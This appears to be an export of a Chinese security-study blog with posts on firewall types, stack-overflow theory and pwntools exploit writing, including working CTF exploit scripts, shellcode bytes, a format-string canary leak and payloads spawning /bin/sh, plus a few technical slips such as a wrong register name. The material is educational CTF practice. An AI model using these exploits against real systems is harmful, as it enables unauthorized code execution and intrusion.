title="包过滤技术"></a>包过滤技术</h3><p>包过滤技术是一种简单、有效的安全控制技术，它工作在网络层，通过在为网络间相互连接的设备上加载允许、禁止来自某些特定的源地址、目的地址、TCP端口号等规则，对通过设备的数据包进行检查，限制数据包进出内部网络</p><p>包过滤技术的优点是对用户透明，传输性能高，但由于安全控制层次在网络层、传输层，安全控制力度也只限于源地址、目的地址和端口号，因而只能进行较为初步的安全控制。</p><h3 id="应用代理技术"><a href="#应用代理技术" class="headerlink" title="应用代理技术"></a>应用代理技术</h3><p>应用代理防火墙工作在OSI的第七层，它通过检查所有应用层的信息包，并将检查的内容信息放入决策过程，从而提高网络的安全性。</p><p>应用网关防火墙是通过打破客户机/服务器模式实现的。每个客户机/服务器通信需要两个二连接：从客户端到防火墙，从防火墙到服务器。</p><p>另外，每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务</p><p>所以，应用网关防火墙具有可伸缩性差的缺点。</p><h3 id="状态检测技术"><a href="#状态检测技术" class="headerlink" title="状态检测技术"></a>状态检测技术</h3><p>状态检测防火墙工作在OSI的第二至四层，采用状态检测包过滤的技术，是传统包过滤功能扩展而来。状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝，这种技术提供了高度安全的解决方案，同事具有较好的适应性和扩展性。</p><p>状态检测防火墙基本保持了简单包过滤防火墙的优点，性能较好，同时在防火墙的核心部分建立状态连接表，维护了连接，将进出昂罗的数据当成一个个的时间来处理，主要特点是由于缺乏对应用层协议的深度检测功能，无法彻底识别数据包中大量的垃圾邮件、广告以及木马程序等。</p><h3 id="完全内容检测技术"><a href="#完全内容检测技术" class="headerlink" title="完全内容检测技术"></a>完全内容检测技术</h3><p>完全内容检测技术防火墙综合状态检测与应用代理技术，并基于多层检测架构，把防病毒、内容过滤，应用识别等功能整合到防火墙中，还包括IPS功能，在网络边界实施OSI第七层的内容扫描，实现了实时在网络边缘部署病毒防护、内容过滤等应用层服务措施。</p><p>完全内容检测技术防火墙可以检测整个数据包内容，根据需要建立连接状态表，网络层保护强，应用层控制细等有点，但由于功能集成度高，对产品硬件要求较高</p><h2 id="防火墙作用"><a href="#防火墙作用" class="headerlink" title="防火墙作用"></a>防火墙作用</h2><ul><li>保护脆弱的服务：过滤不安全服务，提高网络安全减少主机风险</li><li>控制对系统的访问</li><li>集中的安全管理：在防火墙定义的安全规则可以运行于整个内部网络系统，而无需在内部网每台机器上分别设立安全策略</li><li>增强的保密性：可以阻止攻击者获取攻击网络系统的有用信息</li><li>记录和统计网络利用数据以及非法使用数据</li><li>策略执行：提供了指定和执行网络安全策略的手段。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>墨者学院，靶场，防火墙</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出原理及利用学习</title>
    <link href="/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/10/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/113504765?utm_source=qq">https://zhuanlan.zhihu.com/p/113504765?utm_source=qq</a></p><p><a href="https://www.secpulse.com/archives/192491.html">https://www.secpulse.com/archives/192491.html</a></p><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>数据结构，先进后出，先进的数据压入栈底，最后的数据在栈顶</p><ul><li>Push 将数据压入栈顶</li><li>Pop 将栈顶数据弹出</li></ul><p>栈帧：每个未完成运行的函数占用一个独立的连续区域，称作栈帧</p><p><img src="https://s2.loli.net/2022/11/11/RHinVQcJfPOgxSk.png" alt="image.png"></p><ul><li>代码段：存放可执行程序的代码，可读不可写</li><li>数据段：存放程序中已经初始化的静态（全局）变量，可读写</li><li>bss段：存放程序中未初始化的静态（全局）变量，可读写</li><li>堆(heap)：存放动态分配的内容，需要程序员手动分配和释放</li><li>栈(stack)：存放局部变量，如函数的参数、返回地址、局部变量等，有系统自动分配和释放</li></ul><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>栈增长方向：高-&gt;低</p><p>ESP: 栈指针，指向栈顶低地址</p><p>ESP: 基址指针，指向栈底高地址</p><p>EIP: 指令指针，存储即将执行的程序指令地址</p><h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><p>函数调用约定是指当一个函数被调用时，函数的参数会被传递给被调用的函数和返回值会被返回给调用函数，函数的调用约定规定了执行过程中函数的调用者和被调用者之间如何传递参数以及如何恢复栈平衡。</p><p>常用的函数调用约定：</p><pre><code class="hljs">__cdecl # C/C++默认方式，参数从右到左压栈，主调函数负责栈平衡__stdcall # windows API默认方式，参数从右向左入栈，被调函数负责栈平衡__fastcall # 快速调用方式，将参数有限从寄存器(ECX和EDX)传入，其余参数再从右向左从栈传入thiscall # 从右向左入栈，若参数数目固定，则类实例的this指针通过ecx传递给被调函数，被调函数自身清理堆栈，若参数数目补丁，则this指针在所有参数入栈后再入栈，主调函数清理堆栈pascal # 从左向右入栈，支支持固定参数的函数，类型和数量完全可知，被调函数自身清理堆栈，输出的函数名称五任何修饰且全部大写naked call # 编译器不产生保存和恢复寄存器的代码，且不能用return返回返回值，该调用约定用于特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令</code></pre><h3 id="函数调用开始"><a href="#函数调用开始" class="headerlink" title="函数调用开始"></a>函数调用开始</h3><p>在调用一个函数时，系统会为函数分配一个栈帧，栈帧空间为该函数独有</p><p>调用者调用函数过程：</p><ul><li>函数参数从右到左入栈</li><li>返回地址入栈</li><li>上一函数ebp入栈</li><li>balabala</li></ul><p>在上一函数ebp入栈后，就开辟了被调函数的新栈帧，然后被调函数临时变量入栈。</p><pre><code class="hljs">//调用前push arg3 //32位esp-4,64位esp-8push arg2push arg1call func // 压入当前指令地址，即保存返回地址，后jmp到调用函数的入口地址push ebp // 保存旧栈帧底部，在func执行完后再pop ebpmov ebp,ebp // 设置新栈帧的底部sub esp,xxx  // 设置新栈帧的顶部</code></pre><p>（之前在一本书里学过，但是记得不那么清楚了）</p><h3 id="函数调用结束"><a href="#函数调用结束" class="headerlink" title="函数调用结束"></a>函数调用结束</h3><p>函数调用结束，按照相反顺序将数据弹出栈：</p><ul><li>弹出临时变量</li><li>弹出调用函数的ebp值，存入ebp寄存器中</li><li>弹出返回地址，存在eip寄存器中</li></ul><p>返回地址即是用call指令调用函数时下一条指令的地址，存到eip中</p><h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>栈溢出是指向栈中写入超出限定长度的数据，一处的数据覆盖栈中其他数据，从而影响程序运行，当攻击者计算好溢出长度，编写一处数据，用我们想要的地址数据覆盖函数返回地址，那么被调函数调用完返回主函数时，就会跳转到我们覆盖的地址，通过改变程序流程，达到利用的目的。</p><p>目的：</p><ul><li>破坏程序内存结构</li><li>执行system(‘/bin/sh’)</li><li>执行shellcode</li></ul><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><pre><code class="hljs">输入：gets scanf vxcanf输出：sprintf字符串：strcpy strcat bcopy</code></pre><h1 id="简单栈溢出总结"><a href="#简单栈溢出总结" class="headerlink" title="简单栈溢出总结"></a>简单栈溢出总结</h1><ol><li>寻找危险函数：<ol><li>输入</li><li>输出</li><li>字符串</li><li>gets()，直接读取一行，忽略’x00’</li><li>scanf</li><li>vscanf</li><li>sprintf</li><li>strncpy,字符串拼接，遇到’x00’停止</li><li>strcat,字符串拼接，遇到’x00’停止</li><li>bcopy</li><li>寻找危险函数，快速确定程序是否有栈溢出，有则寻找位置</li><li>常见危险函数</li></ol></li><li>确定填充长度<ol><li>覆盖函数返回地址，直接查看ebp即可</li><li>覆盖栈上某个变量的内容，需计算</li><li>覆盖bss段某个变量的内容</li><li>根据实际情况覆盖特定变量或地址的内容</li><li>相对于栈基地址的索引，可以直接通过查看ebp相对偏移量获得</li><li>相对应栈顶指针的索引，需要进行调试</li><li>直接地址索引，相当于直接给定了地址</li></ol></li></ol><p>栈可以看成一个漏斗，栈底地址大，栈顶地址小，在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个额方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。</p><p>栈溢出属于缓冲区溢出，指程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><h1 id="调试举例"><a href="#调试举例" class="headerlink" title="调试举例"></a>调试举例</h1><h2 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h2><pre><code class="hljs">gets() # 不检查输入的字符串长度，用回车判断是否结束，很容易导致栈溢出</code></pre><p>栗子：</p><p>参考文章：<a href="https://www.jianshu.com/p/a2e602da8f7c" title="栈溢出原理">https://www.jianshu.com/p/a2e602da8f7c</a></p><p>代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span></span>{<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"The flag is flag{Tri0mphe!!!}"</span>);<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>];<br>        <span class="hljs-built_in">gets</span>(s);<br>        <span class="hljs-built_in">puts</span>(s);<br>        <span class="hljs-keyword">return</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">int</span> **argv)</span></span>{<br>        <span class="hljs-built_in">vulnerable</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>文件命名为a.c</p><p>扔进linux中编译<code>gcc -m32 -fno-stack-protector -no-pie a.c -o a </code></p><p><code>-m32</code> 生成32位程序<br><code>-fno-stack-protector</code> 不开启堆栈溢出保护，即不生成canary</p><p><code>-no-pie</code> 避免加载基址被打乱</p><p>checksec一下：</p><pre><code class="hljs">Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>IDA分析：</p><pre><code class="hljs">int vulnerable(){    char s[16]; // [esp+4h] [ebp-14h] BYREF    gets(s);    return puts(s);}</code></pre><p>字符串s距离ebp长度为0x14，所以栈结构s为：</p><p><img src="https://s2.loli.net/2022/12/05/mZN8aUwqYc1sEv2.png" alt="image.png"></p><p>success()的地址为0x08048456</p><p>构造payload:</p><pre><code class="hljs">0x14*'a'+'bbbb'+success_addr</code></pre><p>此时栈结构为：</p><p><img src="https://s2.loli.net/2022/12/05/MgIlq5V1mkWZ2H8.png" alt="image.png"></p><p>exp:</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"> # coding-utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # 构造交互对象<br>p=process(<span class="hljs-string">'./a'</span>) <br> # flag函数地址<br>success_addr=<span class="hljs-number">0x08048456</span><br> # 构造payload<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">'bbbb'</span>+p32(success_addr)<br> # 向程序发送字符串<br>p.sendline(payload)<br> # 将代码交互改为手动交互<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>成功！</p><p><img src="https://s2.loli.net/2022/12/05/s6xOwv8ShRoUt7k.png" alt="image.png"></p><h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>开NX保护，可以用ROP绕过，主要思路是在缓冲区溢出基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p><p>gadgets是以ret结尾的指令序列，通过这个指令序列可以修改某些地址的内容，方便控制程序的执行流程</p><p>利用指令集中ret指令，改变指令流的执行顺序。</p><p>ROP攻击前提条件：</p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以找到满足条件的gadgest以及相应gadgets的地址</li></ul><h2 id="ret2text（可能没成功？）"><a href="#ret2text（可能没成功？）" class="headerlink" title="ret2text（可能没成功？）"></a>ret2text（可能没成功？）</h2><p>控制返回地址指向程序本身已有的的代码(.text)并执行。</p><p>代码：两个子函数func()和sys，gets位置存在栈溢出，sys函数未被调用。</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scss"> <span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;<br>int <span class="hljs-built_in">sys</span>(){<br><span class="hljs-built_in">system</span>("/bin/sh");<br>}<br>int <span class="hljs-built_in">func</span>(){<br>char <span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[10]</span>;<br><span class="hljs-built_in">gets</span>(a);<br><span class="hljs-built_in">puts</span>(a);<br>}<br>int <span class="hljs-selector-tag">main</span>(){<br><span class="hljs-built_in">func</span>();<br>}<br></code></pre></td></tr></tbody></table></figure><p>编译：<code>gcc -g -fno-stack-protector -no-pie -o ret2text64 ret2text.c</code></p><p>关闭canary和pie</p><p>先checksec查看安全机制：</p><p><img src="https://s2.loli.net/2022/12/06/U6nrtQwefZ5B9K4.png" alt="image.png"></p><p>got表可写，开启NX保护，用rop</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>我们需要覆盖通过func函数中局部变量a的溢出，覆盖func函数的返回地址，将其引导到sys函数地址就可以获取shell。</p><p>需要：</p><ol><li>局部变量a的地址</li><li>func函数的返回地址</li><li>sys函数的地址</li></ol><h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><p>进入gdb-peda,在func()下断点调试：</p><pre><code class="hljs">l # 查看源代码b 5 # 在第五行下断点r # 运行程序</code></pre><p><img src="https://s2.loli.net/2022/12/06/LxCsYFB1tkHrOJj.png" alt="image.png"></p><pre><code class="hljs">p &amp;a # 打印当前局部变量a的地址p $rbp # 打印rbp地址</code></pre><p><img src="https://s2.loli.net/2022/12/06/4SFHQpMkERqGs7d.png" alt="image.png"></p><p>变量a地址为0xffe376</p><p>rbp=0xffe380</p><p>IDA找到sys函数地址为：0x400577</p><p><img src="https://s2.loli.net/2022/12/06/aLtQBMF5CeI2iwo.png" alt="image.png"></p><p>func函数返回地址，在64位程序中，在rbp之后8字节，所以func_addr=rbp+8=0xffe388</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>分析payload构成，填充局部变量a直到返回地址，然后再将后面8个字节的位置填充为sys函数的地址。</p><p>偏移长度=返回地址-局部变量地址=0x12=18</p><pre><code class="hljs">payload='A'*18+p64(0x400577)</code></pre><p>exp:</p><pre><code class="hljs">from pwn import *p=process("./ret2text64")payload='A'*18+p64(0x400577)p.sendline(payload)p.interactive</code></pre><p>但执行了exp之后，并没有给我什么显示，所以我不确定。</p>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>栈溢出</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN的exp编写学习记录</title>
    <link href="/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>整理以下exp的编写，根据网上文章结合个人去整理的。</p><h1 id="exp的基本框架"><a href="#exp的基本框架" class="headerlink" title="exp的基本框架"></a>exp的基本框架</h1><pre><code class="hljs">from pwn import*DEBUG # 自己设定值，在本地调试还是远程利用，不写也行if DEBUG:    p=process(bin路径) # 在本地调试else:    p=remote(ip,port) # 连接其他主机的服务，需要输入对应ip和端口号payload=…… # 输入payload进行操作以拿到程序的shellp.interactive() # 反弹shell</code></pre><h1 id="io交互"><a href="#io交互" class="headerlink" title="io交互"></a>io交互</h1><pre><code class="hljs">recv() # 接受收到的所有字符recvuntil() # 接收到第一次出现str的内容为止recvline() # 接收一行send(str) # 发送str的内容sendline(str) # 发送str的内容并加个回车发送注: 当不确定io内容时，可以在exp开头加 context.log_level="debug"帮助调试。</code></pre><h1 id="打包解包数据"><a href="#打包解包数据" class="headerlink" title="打包解包数据"></a>打包解包数据</h1><pre><code class="hljs">打包：p64() p32()解包：u64() u32()</code></pre><h1 id="bin文件操作"><a href="#bin文件操作" class="headerlink" title="bin文件操作"></a>bin文件操作</h1><pre><code class="hljs">elf=ELF("binfilepath")libc=ELF("libcpath")bss_base_addr=elf.bss() # 得到程序bss段的起始位置PLT: write_plt=elf.plt["write"]GOT: write_got=elf.got["write"]注： 在系统ASLR关闭的情况下才会找到，否则只能得到一个偏移量</code></pre><h1 id="exp编写练习记录"><a href="#exp编写练习记录" class="headerlink" title="exp编写练习记录"></a>exp编写练习记录</h1><p>以下都是我搜集的pwn题的exp，感觉做题然后学着写exp太慢了，所以先直接抄作业。</p><h2 id="PWN题常用模板"><a href="#PWN题常用模板" class="headerlink" title="PWN题常用模板"></a>PWN题常用模板</h2><h3 id="单个发送（pwn库）"><a href="#单个发送（pwn库）" class="headerlink" title="单个发送（pwn库）"></a>单个发送（pwn库）</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"> #coding=utf<span class="hljs-number">-8</span> #中文乱码<br><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *<br>Thread=zio((<span class="hljs-string">'./pwn'</span>)) # 执行同目录下的pwn<br>Thread=write(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>+<span class="hljs-string">'\x00\x00\x00\x01'</span>) # 输入payload<br>Thread=interact()<br><span class="hljs-comment">//p32(Address)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="ZIO库"><a href="#ZIO库" class="headerlink" title="ZIO库"></a>ZIO库</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> zio import *<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">Thread</span>=zio(('./pwn'))<br> #<span class="hljs-attribute">shellcode1</span>=<span class="hljs-string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span><br><span class="hljs-attribute">shellcode</span>=<span class="hljs-string">'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50'</span><br><span class="hljs-attribute">TargetAddress</span>=0x000000000040066E<br><span class="hljs-attribute">Length</span>=len(shellcode)<br><span class="hljs-attribute">payload</span>=shellcode+'\x90'*(72-Length)+p64(TargetAddress)<br>Thread.write(payload)<br>Thread.interact()<br></code></pre></td></tr></tbody></table></figure><h3 id="pwn库：有消息接收和判断的"><a href="#pwn库：有消息接收和判断的" class="headerlink" title="pwn库：有消息接收和判断的"></a>pwn库：有消息接收和判断的</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>Shellcode=<span class="hljs-string">'a'</span>*<span class="hljs-number">112</span>+<span class="hljs-string">'\x5D\x86\x04\x08'</span><br>Target=process(<span class="hljs-string">'./pwn'</span>)<br>Target.sendline(Shellcode)<br>Target.recvuntil(<span class="hljs-string">':$'</span>)<br> #context.terminal=[<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>]<br> #gdb.attach(proc.pidof(Target)[<span class="hljs-number">0</span>])<br>Target.sendline(<span class="hljs-string">'zhimakaimen'</span>)<br>Target.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="整数溢出型"><a href="#整数溢出型" class="headerlink" title="整数溢出型"></a>整数溢出型</h3><p>exp不理解，先不写。</p><p><a href="https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">libc</span>=ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')<br><span class="hljs-attribute">p</span>=process("./pwn2")<br>context.terminal = [<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>] <br>gdb.attach(proc.pidof(p)[0])       <br>p.recvuntil(<span class="hljs-string">'name:'</span>)<br>p.sendline(<span class="hljs-string">'%p.'</span><span class="hljs-number">*40</span>)     #输出字符串 <br><span class="hljs-attribute">leak_data</span>=p.recvuntil('messages:')<br><span class="hljs-attribute">address</span>=leak_data.split('.')                #将输出的地址分组 然后进行分组<br><span class="hljs-attribute">canary</span>=int(address[30],16)     #这里为什么是 第30个<br><span class="hljs-attribute">stack_addr</span>=int(address[33],16)-0x90+0x8+0x8     #这里也不懂<br><span class="hljs-attribute">put_addr</span>=int(address[22],16)-0x144               <br><span class="hljs-attribute">system_addr</span>=put_addr-(libc.symbols[<span class="hljs-string">'puts'</span>]-libc.symbols[<span class="hljs-string">'system'</span>])<br>payload =<span class="hljs-string">'a'</span><span class="hljs-number">*100</span>+p32(canary)+<span class="hljs-string">'a'</span><span class="hljs-number">*12</span>+p32(system_addr)+<span class="hljs-string">'bbbb'</span>+p32(stack_addr)+<span class="hljs-string">'/bin/sh\x00'</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="攻防世界题解-抄作业"><a href="#攻防世界题解-抄作业" class="headerlink" title="攻防世界题解(抄作业)"></a>攻防世界题解(抄作业)</h2><h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/usr/python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br> # <span class="hljs-attribute">p</span>=process('born')<br><span class="hljs-attribute">birth</span>=<span class="hljs-string">'1927'</span><br><span class="hljs-attribute">name</span>=<span class="hljs-string">"aaaaaaaa"</span>+p32(0x00000786)<br>p.recvuntil(<span class="hljs-string">'What'</span>s Your Birth?<span class="hljs-string">')</span><br><span class="hljs-string">p.sendline(birth)</span><br><span class="hljs-string">p.recvuntil('</span>What<span class="hljs-string">'s Your Name?'</span>)<br>p.sendline(name)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure><h3 id="CGFsb"><a href="#CGFsb" class="headerlink" title="CGFsb"></a>CGFsb</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/env python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br><span class="hljs-attribute">pwnme_addr</span>=0x0804A068<br><span class="hljs-attribute">payload1</span>=<span class="hljs-string">'ABCD'</span><br><span class="hljs-attribute">payload2</span>=p32(pwnme_addr)+'aaaa%10$n'<br>p.recvuntil(<span class="hljs-string">'please tell me your name:\n'</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">'leave your message please:\n'</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN常用脚本语句解释</title>
    <link href="/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/"/>
    <url>/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="接收远端传回的数据"><a href="#接收远端传回的数据" class="headerlink" title="接收远端传回的数据"></a>接收远端传回的数据</h1><pre><code class="hljs">interactive(): 在取得shell之后使用，直接进行交互，相当于回到shell的模式recv(numb=字节大小,timeout=default): 接收指定字节数recvall(): 一直接收直到达到文件EOFrecvline(keepends=True): 接收一行，keepends为是否保留行尾的\nrecvuntil(delims,drop=False): 一直读到delims的pattern出现为止recvrepeat(timeout=default): 持续接收直到EOF或timeout</code></pre><h1 id="向远端发送数据"><a href="#向远端发送数据" class="headerlink" title="向远端发送数据"></a>向远端发送数据</h1><pre><code class="hljs">send(data): 发送数据sendline(data): 发送一行数据，相当于在数据末尾加\nsendlineafter("字符串",data): 在这一串字符串结束之后发送datash.send(data): 进行数据发送，不一定是一行数据</code></pre><blockquote><p>send和sendline的区别是：sendline多发送了一次回车</p></blockquote><pre><code class="hljs">from pwn import * # 将所用模块导入到当前namespaceio=process('./pwn123') # 本地，与文件进行交互 使用了process，结尾要加interactive才能完成交互过程r=remote("xx.xx.xx.xx(注：ip)"，端口号) # 远程，连接指定IP及端口关闭远程连接使用 sh.close()r.recvuntil("字符串") # 运行到字符串位置停下r.sendline(payload) # 发送payloadcontext.log_level="debug" # 脚本在执行时就会输出debug的信息，可以通过观察这些信息查找出错点或者 